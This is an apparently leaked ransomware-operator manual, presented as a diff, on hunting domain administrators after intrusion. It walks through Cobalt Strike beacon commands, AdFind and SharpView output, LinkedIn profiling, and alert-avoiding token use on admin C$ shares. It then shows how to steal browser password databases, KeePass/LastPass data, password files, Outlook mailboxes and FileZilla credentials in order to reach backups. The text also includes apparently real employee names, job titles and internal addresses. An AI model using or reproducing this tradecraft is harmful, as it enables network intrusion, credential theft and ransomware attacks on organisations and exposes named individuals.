@@ -1,0 +1,404 @@
+'''Huntim admin.
+
+And so, if we have servers  NAS  tapes or cloud storages where backups are stacked, and there is no access, then we need credits that only the admin has.
+Accordingly, we need to hunt it down. Usually in those networks where we work admins 1-2-3, no more.
+People are divided into 3 types:
+
+Senior(Senior)
+Medium(Medium)
+Junior(Junior)
+
+Of course, we are interested in seniors because they have more privileges/accesses (read passwords).
+
+To begin with, I will write several options on how to determine the accounts of the very administrators who have passwords on board.
+
+Part1:
+      Option No1:
+         Polling YES
+
+```
+beacon> shell net group "domain admins" /domain
+
+    Tasked beacon to run: net group "domain admins" /domain
+    host called home, sent: 64 bytes
+    received output:
+
+The request will be processed on domain controller of the DOMAIN.com domain.
+
+Domain Admins group name
+Comment Designated administrators of the domain
+
+Members
+-------------------------------------------------------------------------------
+Administrator            ClusterSvc               createch                 
+Createch2                d01adm                   da9adm                   
+p01adm                   PMPUser                  q01adm                   
+repl                     s01adm                   Sapserviced01           
+SAPServiceDA9            sapservicep01            SAPServiceQ01           
+sapservices01            SAPServiceSND            SAPServiceSOL           
+services                 services2                sndadm                   
+soladm                   somadm                   staseb                   
+telnet                   Johnadm               
+The command completed successfully.
+
+```
+We look and filter service accounts and non-service accounts with our eyes.
+The service from the list above is for example
+```
+SAPServiceDA9
+services
+telnet
+servies2
+Sapservice01
+...
+
+```
+Which accounts are MOST LIKELY suitable for us:
+```staseb
+Johnadm
+```
+They were recorded.
+
+We can see who they are in adfind_persons.txt
+
+or through the command
+```shell net user staseb /domain
+```
+
+See an example:
+```
+beacon> shell net user ebernardo /domain
+
+    Tasked beacon to run: net user ebernardo /domain
+    host called home, sent: 57 bytes
+    received output:
+
+
+User name                    ebernardo
+Full Name                    Eric Bernardo
+Comment                     
+User's comment               
+Country/region code          (null)
+Account active               Yes
+Account expires              Never
+
+Password last set            2020-12-08 12:05:15 PM
+Password expires             2021-06-06 12:05:15 PM
+Password changeable          2020-12-08 12:05:15 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   2021-01-29 2:25:24 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Remote Desktop Users
+                             *Server Operators     
+Global Group memberships     *US Users             *Great Plains Users   
+                             *Citrix Group         *VPN Users Saskatoon 
+                             *Admins - AD Basic    *VPNUsersHeadOffice   
+                             *Executives           *All Winnipeg Staff   
+                             *Scribe Console Users *Domain Admins       
+                             *VPN Users USA        *Workstation.admins   
+                             *Domain Users         
+The command completed successfully.
+
+```
+We look at who is - included in a dozen groups, SOMETIMES in the Comment column they write who he is - engineer  sys admin  support  business consultant.
+in Last Logon, the account should be ACTIVE - that is, the last logon today/yesterdaythis week, but not a year ago or Never.
+If it is not clear who it is after the survey see adfind + check linkedin (rzdel below).
+
+
+So 2-3-5 accounts eventually pull out of the admin domain and poll everyone and should have an idea who it is. As a result of 1-2-3 accounts, it turns out to find who can be an admin.
+
+Option No2:
+      Turning into home analysts - watch Adfind.
+      We are interested in the adfind_groups file
+      We go in, we see a bunch of text
+      Press Ctrl + F(Notepad2 / Geany)
+      Enter
+      ```dn:CN=
+      ```
+      And the Find All in current document button.
+      
+on the output we get APPROXIMATELY the following (I cut out a piece and left 10-20 lines, usually here from 100 to 10000 lines)
+      ```
+adfind_groups:3752: dn:CN=SQLServer2005SQLBrowserUser$TRUCAMTLDC,CN=Users,DC=domain,DC=com
+adfind_groups:3775: dn:CN=clubsocial,CN=Users,DC=domain,DC=com
+adfind_groups:3800: dn:CN=Signature Intl-Special,OU=Groupes,OU=Infra,DC=domain,DC=com
+adfind_groups:3829: dn:CN=FIMSyncAdmins,CN=Users,DC=domain,DC=com
+adfind_groups:3852: dn:CN=GRP-GRAPHISTE,OU=FG-GRP,DC=domain,DC=com
+adfind_groups:3877: dn:CN=IT,CN=Users,DC=domain,DC=com
+adfind_groups:3902: dn:CN=MSOL_AD_Sync_RichCoexistence,CN=Users,DC=domain,DC=com
+adfind_groups:3925: dn:CN=WinRMRemoteWMIUsers__,CN=Users,DC=domain,DC=com
+adfind_groups:3946: dn:CN=EDI,CN=Users,DC=domain,DC=com
+adfind_groups:3967: dn:CN=Signature Canada,OU=Groupes,OU=Infra,DC=domain,DC=com
+adfind_groups:4037: dn:CN=Signature USA,OU=Groupes,OU=Infra,DC=domain,DC=com
+
+      ```
+      And so, we retrieved the active directory groups.
+      What we are interested in here and why we did it - in active directroy everything is structured and in USA EU networks everything is done as clearly as possible transparently with comments, notes, prescriptions, etc.
+      We are interested in a group that deals with IT, administration, LAN engineering.
+      What we got after the search - we take it to a new notebook and do a search by the following key words:
+      ```
+      IT
+      Admin
+      engineer
+      -----
+      ```
+      In the example above we find the following line
+      ```
+      adfind_groups:3877: dn:CN=IT,CN=Users,DC=domain,DC=com
+      ```
+      Go to line 3877 in the adfind_Groups.txt and see the following:
+      ```
+dn:CN=IT,CN=Users,DC=domain,DC=com
+>objectClass: top
+>objectClass: group
+>cn: IT
+>description: Informatique
+>member: CN=MS Surface,OU=IT,DC=domain,DC=com
+>member: CN=Gyslain Petit,OU=IT,DC=domain,DC=com
+>member: CN=ftp,CN=Users,DC=domain,DC=com
+>member: CN=St-Amand\, Sebastien\, CDT,OU=IT,DC=domain,DC=com
+```
+Users of ftp and MS Surface skip, but Gyslain Petit and St Amand Sebastien take into circulation.
+Next, open the ad_users.txt
+Enter Gyslain Petit
+Find a user with the following information:
+```
+
+dn:CN=Gyslain Petit,OU=IT,DC=trudeaucorp,DC=com
+>objectClass: top
+>objectClass: person
+>objectClass: organizationalPerson
+>objectClass: user
+>cn: Gyslain Petit
+>sn: Petit
+>title: Directeur, technologie de l'information
+>physicalDeliveryOfficeName: 217
+>givenName: Gyslain
+>distinguishedName: CN=Gyslain Petit,OU=IT,DC=trudeaucorp,DC=com
+>instanceType: 4
+>whenCreated: 20020323153742.0Z
+>whenChanged: 20201212071143.0Z
+>displayName: Gyslain Petit
+>uSNCreated: 29943
+>memberOf: CN=GRP_Public_USA_P,OU=Securite-GRP,DC=trudeaucorp,DC=com
+>memberOf: CN=GRP-LDAP-VPN,OU=FG-GRP,DC=trudeaucorp,DC=com
+>memberOf: CN=IT Support,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=Directeurs,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=GRP-IT,OU=FG-GRP,DC=trudeaucorp,DC=com
+>memberOf: CN=Signature Canada,OU=Groupes,OU=Infra,DC=trudeaucorp,DC=com
+>memberOf: CN=EDI,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=IT,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=TRUDEAU-MONTREAL,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=everyone,CN=Users,DC=trudeaucorp,DC=com
+>uSNChanged: 6908986
+>department: IT Manager
+```
+Look at the title and who is it here? Director of Information Technology. In the bullseye, it would seem, but the director does not always have passwords, but the System Administrator of some kind - quite.
+Therefore, for the second user and more, we carry out similar manipulations. At home (=in the conf) we make notes who is who and write down logins from the environment (sAMAccountname) something like this:
+```>sAMAccountName: gpetit
+```
+```
+gpetit - IT Director
+staseb - so that
+```
+
+The second part of option No. 2 (Simplified):
+Look initially in adfind_users.txt
+We search by
+```title:
+description
+departament
+```
+If you're lucky, there will be directly written posts. In my test case, it looks like this:
+
+```
+adfind_persons:280: >title: Responsable, logistique direct import
+adfind_persons:1836: >title: Chef des services techniques
+adfind_persons:1955: >title: Chef comptable
+adfind_persons:4544: >title: Directeur, technologie de l'information
+adfind_persons:6064: >title: Présidente
+adfind_persons:6191: >title: Chargée de projets, mise en marché
+adfind_persons:6285: >title: Directrice marketing
+adfind_persons:6848: >title: Coordonnatrice à la logistique
+adfind_persons:6948: >title: Responsable de l'expedition
+```
+Accordingly, we run through the eyes and the records are found.
+
+And so, these are easy methods. Consider alternative searches for admin accounts.
+I know so far only 1 method of simple - linkedin
+Enter a google query
+```
+NASHAJERTVA.COM linkedin
+```
+instead of the domain - insert the domain of the office.
+
+Go to Members
+Do a search there on
+```
+System
+Admin
+Engineer
+Network
+It
+```
+If someone has a name + surname, then we hammer it into the background and the account is found.
+If you know about the methods more effectively - please write to @rozetka
+
+And so, part #1 is finished.
+
+Let's proceed to the admin hunt and inspection
+
+Part #2:
+Admin's Huntime Standard Via SharpView
+SharpView.exe can borrow from conferences from their team leads or from the confs of the software
+The command for hunt is as follows:
+On Linux
+```
+execute-assembly /home/user/soft/scripts/SharpView.exe Find-DomainUserLocation -UserIdentity gpetit
+```
+On Windows >
+```
+execute-assembly C:\Users\Андрей\Soft\Hacking\SharpView.exe Find-DomainUserLocation -UserIdentity gpetit
+```
+where gpetit is the account of the person we are looking for. what is written in adfinusers in sAMAccountname - insert it here.
+
+As a result, we get approximately the following log:
+
+```
+UserDomain      : domain
+UserName        : gpetit
+ComputerName    : DC01.domain.LOCAL
+IPAddress       : 172.16.1.3
+SessionFrom     : 192.168.100.55
+SessionFromName :
+LocalAdmin      :
+
+UserDomain      : domain
+UserName        : gpetit
+ComputerName    : SQL01.domain.LOCAL
+IPAddress       : 172.16.1.30
+SessionFrom     :  192.168.100.55
+SessionFromName :
+LocalAdmin      :
+
+UserDomain      : domain
+UserName        : gpetit
+ComputerName    : lptp-gpetit.domain.LOCAL
+IPAddress       : 172.16.1.40
+SessionFrom     : 192.168.100.55
+SessionFromName :
+LocalAdmin      :
+
+```
+
+And so, the log will be of an approximate format as we should be with this -
+First, how the software works - it asks where at the moment the user is at least authorized. And our user is not simple - he is an administrator and at some point he can be authorized on 20-30-50 servers.
+How do we filter and not get bogged down in that?
+First, we remove the OS that we are not interested in
+for example, the first in the list DC01 is clearly DomainController01, you can check it by adfind_computers.txt or portscan 172.16.1.13 and see that it is a SERVER OS. And we need a client.
+The second is SQL01 - DATABASE OS. It doesn't suit us.
+Let's see the third one - lptp-gpetit. Hmm, our user's name is gpetit, and lptp stands for laptop, that is, laptop. Maybe it's just him.
+#Likewise it happens that the admin is connected ONLY to the server OS, but in the SessionFrom - IP from another subnet (e.g. vpn subnet) where it sits quietly but SharpView did not "take" it - you can also take it into circulation.
+Next is an IMPORTANT POINT.
+Beginners first of all try to raise a session there and VERY OFTEN catch an alert. Alert at the admin = cutting out of the network, loss of time, nerves. You can't do that!
+What we're going to do is poll it through the file system.
+We do the following
+```shell net view \\172.16.1.40 /ALL
+```
+On the way out we see his local wilds.
+```
+C$
+D$
+```
+Shoe the token (It is the token that is recommended, because pth leaves a slightly different Event ID on the domain controller, and this can be noticed by the admin and cut us out)
+
+Open File Manager in cobalt:
+```\\172.16.1.40\c$
+```
+or use shell via
+```
+shell dir 172.16.1.40c$```
+
+See what's on the C drive fluently
+Go to the folder
+```172.16.1.40c$Usersgpetit
+```
+
+Usually if it is REALLY an admin work station - it has a lot of junk ala Virtualbox / putty / winscp etc etc
+
+How do we "inspect" it, here is a list of interesting directories:
+
+Desktop
+```\\172.16.1.40\c$\Users\gpetit\Desktop
+```
+```
+\\172.16.1.40\c$\Users\gpetit\OneDrive
+\\172.16.1.40\c$\Users\gpetit\Downloads
+\\172.16.1.40\c$\Users\gpetit\Desktop
+\\172.16.1.40\c$\Users\gpetit\Documents
+
+```
+Here are the folders with custom configurations, below is a list of what can be extracted:
+```\\172.16.1.40\c$\Users\gpetit\AppData\Local
+```
+
+```\\172.16.1.40\c$\Users\gpetit\AppData\Roaming
+```
+
+```
+\\172.16.1.40\c$\Users\gpetit\AppData\Local\Google\Chrome\User Data\Default
+```
+Here lie history && Login Data from chrome.
+The history can be directly downloaded and viewed using DBrowser for SQLite(nix win). What is useful - to see where the admin goes, for whom he votes, you can sort the histories by title and find direct NAS / Tape / vSphere etc. VERY useful thing.
+Login Data - logins and passwords are located. Encrypted(!). If it weighs 38-42kb then it's EMPTY. If it weighs more than 40-45kb (from 100kb to 1-2 megabytes) - then there are DEFINITELY passwords. If you have the right URL with a password , contact your team leader.
+It also happens in chrome that there are no passwords in the Login Date, but if you look closely at the profile folder, you will find the extenstions folder and there is lastpass. This can also happen in practice - in this case, go to RDP at night and export passwords (either keylogger or other options)
+
+Similarly, you can view the Firefox / Edge folder (I will add the paths, google easily)
+
+Also, sis admins OFTEN have the following folders in AppDataRoaming && AppDataLocal:
+```Keepass
+LastPass
+```
+there are their configs. We drag them, put them in confo. if you find such a thing- then MOST LIKELY there is a lot of EXACTLY the RIGHT passwords.
+
+It also happens that the admin directly on the desktop stores ala
+```access.xlsx
+passwords.docx
+```
+We swing, we break, we look.
+
+also has an outlook folder
+```\\172.16.1.40\c$\Users\gpetit\AppData\Local\Microsoft\Outlook
+```
+Here lies the file ala
+```gpetit@domain.com - Exchange1.ost
+```
+It contains THE CORRESPONDENCE of this pepper. You can download it to yourself, open the free ost viewer and see the mail input / output. REGULARLY it is useful to understand difficult situations with this technique.
+It is copied simply - cut down outlook.exe, make a copy-paste of the .ost file, then the user will open outlook for himself.
+
+```
+\\172.16.1.40\c$\Users\gpetit\AppData\Local\Filezilla
+\\172.16.1.40\c$\Users\gpetit\AppData\Roaming\Filezilla
+```
+Here, sitemanager files.xml can be with SSH FTP credits. We swing, we watch, we throw it in the confo.
+
+Also inspect \\172.16.1.40\C$\ProgramData
++Program files / x86
++ Local disks that fell out in net view \\host /ALL
+D$ etc
+
+Also in ad_users.txt is homeDir - we also watch it, study it.
+
+Like everything.
+Why the manual was written - so that they did not try to go headlong to raise the session and catch alerts from the admin.
+Our job is more about figuring out what works, rather than adjusting the brute force to all sorts of accesses.
+Everything is already hacked, you just need to look at everything through the eyes of an admin!
+The main task of the admin hunt is to understand where he stores passwords and steal the databaseexcelfiletextdocument
